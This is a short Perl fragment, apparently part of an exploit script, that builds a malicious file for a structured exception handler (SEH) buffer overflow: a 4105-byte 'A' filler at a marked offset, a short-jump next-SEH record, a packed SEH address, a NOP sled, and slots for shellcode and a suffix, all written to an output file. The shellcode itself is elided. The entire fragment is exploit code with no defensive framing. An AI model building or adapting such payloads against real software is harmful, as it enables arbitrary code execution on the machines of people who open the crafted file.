...
my $hammer="http:AA"."\x41"x4105;
#[*] Exact match at offset 4105
my $nseh="\xeb\x06\x90\x90";
my $seh= pack("V", 0x10010328);
my $small_jump = "\x90"x14 ."\xeb\x06\x90";
my $nopsled = "\x90"x100;
...
open (FILE, ">$file");
print FILE $hammer.$nseh.$seh.$small_jump.$nopsled.$shellcode.$suffix;
close (FILE);
